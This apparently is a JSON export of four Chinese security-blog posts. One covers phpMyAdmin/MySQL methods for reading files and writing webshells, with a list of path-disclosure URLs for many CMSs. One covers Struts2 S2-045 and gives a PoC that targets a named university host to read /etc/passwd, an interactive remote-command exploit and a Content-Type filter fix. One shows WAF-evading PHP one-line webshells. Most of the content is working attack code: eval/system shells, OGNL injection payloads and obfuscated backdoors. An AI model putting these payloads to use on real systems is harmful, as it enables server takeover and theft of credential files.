[{"title":"关于phpmyadmin GetShell思路总结","date":"2017-04-08T16:08:16.000Z","path":"2017/04/09/mysql/","text":"看了网上的许多文章 总结的不是很到位 这里在根据自己的经验总结一些 如有漏缺 请联系我~低权限读文件用到的mysql语句1LOAD DATA LOCAL INFILE 'C:/mysql/data/mysql/user.MYD' INTO TABLE test fields terminated by '' LINES TERMINATED BY '\\0'; LOAD DATA LOCAL INFILE 继承的是 执行客户端 用户权限 且只能读 mysql客户端 本地 文件webshell 中如果能读取 user.MYD 文件 ，LOAD DATA LOCAL INFILE 就能读该文件 若webshell 中不能读取 user.MYD文件，LOAD DATA LOCAL INFILE 就不能读该文件 使用方法: 利用场景 phpmyadmin 或其它可执行sql 命令的 地方并且站库同服务 情况下读取相关配置文件 ，或在权限配置不当情况下 读 user.MYD SQL语句利用日志写shelloutfile被禁止，或者写入文件被拦截； 在数据库中操作如下：（必须是root权限） 1234show variables like &apos;%general%&apos;; #查看配置set global general_log = on; #开启general log模式set global general_log_file = &apos;/var/www/html/1.php&apos;; #设置日志目录为shell地址select &apos;&lt;?php eval($_POST[cmd]);?&gt;&apos; #写入shell SQL查询免杀shell的语句 1SELECT \"&lt;?php $p = array('f'=&gt;'a','pffff'=&gt;'s','e'=&gt;'fffff','lfaaaa'=&gt;'r','nnnnn'=&gt;'t');$a = array_keys($p);$_=$p['pffff'].$p['pffff'].$a[2];$_= 'a'.$_.'rt';$_(base64_decode($_REQUEST['username']));?&gt;\" getshell 方法12345678910111213141516171819202122232425262728方法一：CREATE TABLE `mysql`.`io` (`ioi` TEXT NOT NULL );INSERT INTO `mysql`.`io` (`ioi` )VALUES (&apos;&lt;?php @eval($_POST[io])?&gt;&apos;);SELECT xiaomaFROM study INTO OUTFILE &apos;E:/wamp/www/1.php&apos;;#以上同时执行，在数据库: mysql 下创建一个表名为：io，字段为ioi，导出到E:/wamp/www/1.php一句话连接密码：io方法二：Create TABLE io (ioi text NOT NULL);Insert INTO io (ioi) VALUES(&apos;&lt;?php eval($_POST[io])?&gt;&apos;);select ioi from io into outfile &apos;E:/wamp/www/1.php&apos;;Drop TABLE IF EXISTS ioi;方法三：读取文件内容： select load_file(&apos;E:/xamp/www/s.php&apos;);写一句话：select &apos;&lt;?php @eval($_POST[cmd])?&gt;&apos;INTO OUTFILE &apos;E:/xamp/www/1.php&apos;cmd执行权限：select &apos;&lt;?php echo \\&apos;&lt;pre&gt;\\&apos;;system($_GET[\\&apos;cmd\\&apos;]); echo \\&apos;&lt;/pre&gt;\\&apos;; ?&gt;&apos; INTO OUTFILE &apos;E:/xamp/www/1.php&apos;select load_file(&apos;E:/xamp/www/xiaoma.php&apos;);方法四：select &apos;&lt;?php echo \\&apos;&lt;pre&gt;\\&apos;;system($_GET[\\&apos;cmd\\&apos;]); echo \\&apos;&lt;/pre&gt;\\&apos;; ?&gt;&apos; INTO OUTFILE &apos;E:/xamp/www/xiaoma.php&apos;然后访问网站目录：http://www.xxxx.com/xiaoma.php?cmd=dir php爆绝对路径方法1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151161171181191201211221231241251261271281291301311321331341351361371381391401411421431441451461471481491501511521531541551561571581591601611621631641651661、单引号爆路径说明：直接在URL后面加单引号，要求单引号没有被过滤(gpc=off)且服务器默认返回错误信息。www.xxx.com/news.php?id=149′2、错误参数值爆路径说明：将要提交的参数值改成错误值，比如-1。-99999单引号被过滤时不妨试试。www.xxx.com/researcharchive.php?id=-13、Google爆路径说明：结合关键字和site语法搜索出错页面的网页快照，常见关键字有warning和fatal error。注意，如果目标站点是二级域名，site接的是其对应的顶级域名，这样得到的信息要多得多。Site:xxx.edu.tw warningSite:xxx.com.tw “fatal error”4、测试文件爆路径说明：很多网站的根目录下都存在测试文件，脚本代码通常都是phpinfo()。www.xxx.com/test.phpwww.xxx.com/ceshi.phpwww.xxx.com/info.phpwww.xxx.com/phpinfo.phpwww.xxx.com/php_info.phpwww.xxx.com/1.php5、phpmyadmin爆路径说明：一旦找到phpmyadmin的管理页面，再访问该目录下的某些特定文件，就很有可能爆出物理路径。至于phpmyadmin的地址可以用wwwscan这类的工具去扫，也可以选择google。PS：有些BT网站会写成phpMyAdmin。1. /phpmyadmin/libraries/lect_lang.lib.php2./phpMyAdmin/index.php?lang[]=13. /phpMyAdmin/phpinfo.php4. load_file()5./phpmyadmin/themes/darkblue_orange/layout.inc.php6./phpmyadmin/libraries/select_lang.lib.php7./phpmyadmin/libraries/lect_lang.lib.php8./phpmyadmin/libraries/mcrypt.lib.php6、配置文件找路径说明：如果注入点有文件读取权限，就可以手工load_file或工具读取配置文件，再从中寻找路径信息（一般在文件末尾）。各平台下Web服务器和PHP的配置文件默认路径可以上网查，这里列举常见的几个。Windows:c:\\windows\\php.ini php配置文件c:\\windows\\system32\\inetsrv\\MetaBase.xml IIS虚拟主机配置文件Linux:/etc/php.ini php配置文件/etc/httpd/conf.d/php.conf/etc/httpd/conf/httpd.conf Apache配置文件/usr/local/apache/conf/httpd.conf/usr/local/apache2/conf/httpd.conf/usr/local/apache/conf/extra/httpd-vhosts.conf 虚拟目录配置文件7、nginx文件类型错误解析爆路径说明：要求Web服务器是nginx，且存在文件类型解析漏洞。有时在图片地址后加/x.php，该图片不但会被当作php文件执行，有可能爆出物理路径www.xxx.com/xx.jpg/x.php8、其他dedecms/member/templets/menulit.phpplus/paycenter/alipay/return_url.php plus/paycenter/cbpayment/autoreceive.phppaycenter/nps/config_pay_nps.phpplus/task/dede-maketimehtml.phpplus/task/dede-optimize-table.phpplus/task/dede-upcache.phpWPwp-admin/includes/file.phpwp-content/themes/baiaogu-seo/footer.phpecshop商城系统暴路径漏洞文件/api/cron.php/wap/goods.php/temp/compiled/ur_here.lbi.php/temp/compiled/pages.lbi.php/temp/compiled/user_transaction.dwt.php/temp/compiled/history.lbi.php/temp/compiled/page_footer.lbi.php/temp/compiled/goods.dwt.php/temp/compiled/user_clips.dwt.php/temp/compiled/goods_article.lbi.php/temp/compiled/comments_list.lbi.php/temp/compiled/recommend_promotion.lbi.php/temp/compiled/search.dwt.php/temp/compiled/category_tree.lbi.php/temp/compiled/user_passport.dwt.php/temp/compiled/promotion_info.lbi.php/temp/compiled/user_menu.lbi.php/temp/compiled/message.dwt.php/temp/compiled/admin/pagefooter.htm.php/temp/compiled/admin/page.htm.php/temp/compiled/admin/start.htm.php/temp/compiled/admin/goods_search.htm.php/temp/compiled/admin/index.htm.php/temp/compiled/admin/order_list.htm.php/temp/compiled/admin/menu.htm.php/temp/compiled/admin/login.htm.php/temp/compiled/admin/message.htm.php/temp/compiled/admin/goods_list.htm.php/temp/compiled/admin/pageheader.htm.php/temp/compiled/admin/top.htm.php/temp/compiled/top10.lbi.php/temp/compiled/member_info.lbi.php/temp/compiled/bought_goods.lbi.php/temp/compiled/goods_related.lbi.php/temp/compiled/page_header.lbi.php/temp/compiled/goods_script.html.php/temp/compiled/index.dwt.php/temp/compiled/goods_fittings.lbi.php/temp/compiled/myship.dwt.php/temp/compiled/brands.lbi.php/temp/compiled/help.lbi.php/temp/compiled/goods_gallery.lbi.php/temp/compiled/comments.lbi.php/temp/compiled/myship.lbi.php/includes/fckeditor/editor/dialog/fck_spellerpages/spellerpages/server-scripts/spellchecker.php/includes/modules/cron/auto_manage.php/includes/modules/cron/ipdel.phpucenter爆路径ucenter\\control\\admin\\db.phpDZbbsmanyou/admincp.php?my_suffix=%0A%0DTOBY57z-blogadmin/FCKeditor/editor/dialog/fck%5Fspellerpages/spellerpages/server%2Dscripts/spellchecker.phpphp168爆路径admin/inc/hack/count.php?job=listadmin/inc/hack/search.php?job=getcodeadmin/inc/ajax/bencandy.php?job=docache/MysqlTime.txtPHPcms2008-sp4注册用户登陆后访问phpcms/corpandresize/process.php?pic=../images/logo.gifbo-blogPoC:/go.php/&lt;[evil code]CMSeasy爆网站路径漏洞漏洞出现在menu_top.php这个文件中lib/mods/celive/menu_top.php/lib/default/ballot_act.phplib/default/special_act.php 相关文章链接低权限读文件SQL语句利用日志写shellphpmyadmin获取shell方法总结","tags":[{"name":"phpmyadmin","slug":"phpmyadmin","permalink":"http://iosmosis.github.io/tags/phpmyadmin/"},{"name":"Getshell","slug":"Getshell","permalink":"http://iosmosis.github.io/tags/Getshell/"},{"name":"mysql","slug":"mysql","permalink":"http://iosmosis.github.io/tags/mysql/"}]},{"title":"不如慢慢走下去","date":"2017-04-07T04:47:01.000Z","path":"2017/04/07/Time/","text":"坎坎坷坷还在继续着 与其说选择的这条路是为了谋生不如说选择是因为热爱 –2017/04/07","tags":[{"name":"About Me","slug":"About-Me","permalink":"http://iosmosis.github.io/tags/About-Me/"},{"name":"随笔","slug":"随笔","permalink":"http://iosmosis.github.io/tags/随笔/"}]},{"title":"Struts 2 S2-045 Jakarta插件远程代码执行漏洞加固方法","date":"2017-03-07T07:02:56.000Z","path":"2017/03/07/str2-045/","text":"近日，安恒信息安全研究院WEBIN实验室高级安全研究员nike.zheng发现著名J2EE框架-Struts2存在远程代码执行的严重漏洞。漏洞编号S2-045，CVE-2017-5638 漏洞名称基于 Jakarta plugin插件的Struts远程代码执行漏洞官方评级高危漏洞描述Apache Struts 2被曝出存在远程命令执行漏洞，漏洞编号S2-045，CVE编号CVE-2017-5638，在使用基于Jakarta插件的文件上传功能时，有可能存在远程命令执行，导致系统被黑客入侵。恶意用户可在上传文件时通过修改HTTP请求头中的Content-Type值来触发该漏洞，进而执行系统命令漏洞利用条件和方式黑客通过Jakarta 文件上传插件实现远程利用该漏洞执行代码。1.基于Jakarta（Jakarta Multipart parser）插件的文件上传功能2.恶意攻击者精心构造Content-Type的值 漏洞影响范围Struts 2.3.5 – Struts 2.3.31Struts 2.5 – Struts 2.5.10 Created by Lukasz Lenart, last modified yesterday at 01:14 PM Poc123456789101112131415161718192021222324252627282930313233343536373839404142#! /usr/bin/env python# encoding:utf-8import urllib2import sysfrom poster.encode import multipart_encodefrom poster.streaminghttp import register_openersheader1 =&#123;\"Host\":\"alumnus.shu.edu.cn\",\"Connection\":\"keep-alive\",\"Refer\":\"alumnus.shu.edu.cn\",\"Accept\":\"*/*\",\"X-Requested-With\":\"XMLHttpRequest\",\"Accept-Encoding\":\"deflate\",\"Accept-Language\":\"zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4\",&#125;def poc(): register_openers() datagen, header = multipart_encode(&#123;\"image1\": open(\"tmp.txt\", \"rb\")&#125;) header[\"User-Agent\"]=\"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36\" header[\"Content-Type\"]='''%&#123;(#nike='multipart/form-data'). (#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS). (#_memberAccess?(#_memberAccess=#dm): ((#container=#context['com.opensymphony.xwork2.ActionContext.container']). (#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)). (#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()). (#context.setMemberAccess(#dm)))).(#cmd='cat /etc/passwd'). (#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))). (#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)). (#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)). (#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse(). getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)). (#ros.flush())&#125;''' request = urllib2.Request(str(sys.argv[1]),datagen,headers=header) response = urllib2.urlopen(request) print response.read()poc() Exp123456789101112131415161718192021222324252627282930313233# coding:utf-8import requests,json,redef Poc(url,command): headers = &#123;'Content-Type': 'multipart/form-data; boundary=f363ec3cc5ab44708db6a275b1f31a16',\"User-Agent\":\"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36\"&#125; headers[\"Content-Type\"] = \"%&#123;(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=' \\ \"+command+\"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;\" data = json.dumps(&#123;\"image1\":url&#125;) try: req = requests.post(url,data=data,headers=headers) if req.status_code == 200: print req.content except requests.ConnectionError,e: print eth = &#123;\"url\":\"\"&#125;while True: if th.get(\"url\") != \"\": input_cmd = raw_input(\"cmd &gt;&gt;: \") if input_cmd == \"exit\": exit() elif input_cmd == 'set': url = raw_input(\"set url :\") th['url'] = url elif input_cmd == 'show url': print th.get(\"url\") else: Poc(th.get(\"url\"),input_cmd) else: url = raw_input(\"set url :\") th[\"url\"] = url 加固方式通过判断Content-Type头是否为白名单类型，来限制非法Content-Type的攻击。12345678910111213141516171819202122232425262728293031323334353637383940414243444546import java.io.IOException;import javax.servlet.Filter;import javax.servlet.FilterChain;import javax.servlet.FilterConfig;import javax.servlet.ServletException;import javax.servlet.ServletRequest;import javax.servlet.ServletResponse;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;public class SecurityFilter extends HttpServlet implements Filter &#123; /** * */ private static final long serialVersionUID = 1L; public final String www_url_encode= \"application/x-www-form-urlencoded\"; public final String mul_data= \"multipart/form-data \"; public final String txt_pla= \"text/plain\"; public void doFilter(ServletRequest arg0, ServletResponse arg1, FilterChain arg2) throws IOException, ServletException &#123; HttpServletRequest request = (HttpServletRequest) arg0; HttpServletResponse response = (HttpServletResponse) arg1; String contenType=request.getHeader(\"conTent-type\"); if(contenType!=null&amp;&amp;!contenType.equals(\"\")&amp;&amp;!contenType.equalsIgnoreCase(www_url_encode)&amp;&amp;!contenType.equalsIgnoreCase(mul_data)&amp;&amp;!contenType.equalsIgnoreCase(txt_pla))&#123; response.setContentType(\"text/html;charset=UTF-8\"); response.getWriter().write(\"非法请求Content-Type！\"); return; &#125; arg2.doFilter(request, response); &#125; public void init(FilterConfig arg0) throws ServletException &#123; &#125;&#125; 将Java编译以后的“SecurityFilter.class”（SecurityFilter.java是源代码文件）复制到应用的WEB-INF/classes目录下⦁ 配置Filter 将下面的代码加入WEB-INF/web.xml文件中12345678&lt;filter&gt; &lt;filter-name&gt;SecurityFilter&lt;/filter-name&gt; &lt;filter-class&gt;SecurityFilter&lt;/filter-class&gt; &lt;/filter&gt;&lt;filter-mapping&gt; &lt;filter-name&gt;SecurityFilter&lt;/filter-name&gt; &lt;url-pattern&gt;/*&lt;/url-pattern&gt;&lt;/filter-mapping&gt; /代表拦截所有请求，进行攻击代码检查，.action只检查.action结尾的请求。如果你正在使用基于Jakarta的文件上传Multipart解析器，请升级到 Apache Struts 2.3.32或2.5.10.1版；或者也可以切换到不同的实现文件上传Multipart解析器重启应用即可","tags":[{"name":"S2-045","slug":"S2-045","permalink":"http://iosmosis.github.io/tags/S2-045/"},{"name":"poc","slug":"poc","permalink":"http://iosmosis.github.io/tags/poc/"},{"name":"exp","slug":"exp","permalink":"http://iosmosis.github.io/tags/exp/"}]},{"title":"一句话Shell编写思路","date":"2017-03-05T04:47:01.000Z","path":"2017/03/05/oneshell/","text":"很多人都头痛 好不容易找到上传点拿shell了 却发现有狗 = = 其实过狗并不是很难 所以我在这里总结一下思路 经典方式应该是很常见的方法 利用 可变变量进行赋值传值来打到过狗目的，例如：12345678&lt;?php $jg16=base64_decode;$z=$jg16(YXNzZXJ0);$z($_POST[q]);?&gt;这个一句话需要用到这个函数//base64_encode();//base64编码//base64_decode();//base64解码主要就是进行加密然后传值绕过对一句话的检测 这次暂不详细讲解 ##system()的巧妙利用 ##调用system()由于在php中system函数属于系统函数所以对于一般的waf是可以通杀的 123&lt;?phpsystem($_GET[‘a’]($_GET[‘b’]))?&gt; 利用古典密码进行对shell加密在CTF中 经常会碰到密码学问题 比如古典密码（凯撒加密 rot13 等等）123456function kaisa($arr)&#123;for($i=0;$i&lt; strlen($arr);$i++)&#123;$arr[$i]=chr(ord($arr[$i])-6);&#125;return $arr;&#125; 这里的凯撒密码采用按ascii码进行向ascii增大的方向移动6位得到的密文，所以向ascii减小的方向移动6位来解码所以构造出一句话1234567&lt;?php$arr=\"j&#123;fq-)dUTXY`&#125;b.@\";for($i=0;$i&lt; strlen($arr);$i++)&#123;$arr[$i]=chr(ord($arr[$i])-5);&#125;eval($arr);?&gt; 利用函数代码执行来代替eval利用 create_function代码执行漏洞 该函数漏洞这里不进行详细讲解 。 create_function要接收两个参数$args和$code来组成新的函数fucntion_lambda_func($args){$code;} 并eval(function_lambda_func($args){$code;})，那么我们只要构造$code来闭合}然后将自己的代码放到函数体外面就可以执行这里构造为$code = “n;}$_POST[x];/*”;注意：双引号里面的变量会进行解析，即如果我们echo $code 并且post提交x=phpinfo();那么输出应该是：n;}phpinfo();;/ 123456789101112131415161718payload解析： ;来结束语句 &#125;来结束函数体 phpinfo();;就在函数体外面被eval执行了 /*注释多余的代码 最终代码：eval(function_lambda_func($args)&#123;n;&#125;phpinfo();;/*&#125;)最终构造出&lt;?php$args = \"１\";$code = \"n;&#125;$_POST[x];/*\";echo create_function('$args',$code);?&gt; 这些思路 只是用来启发大家 如果更好的思路 可以一起分享 我会整合到一起","tags":[{"name":"shell","slug":"shell","permalink":"http://iosmosis.github.io/tags/shell/"},{"name":"waf","slug":"waf","permalink":"http://iosmosis.github.io/tags/waf/"}]}]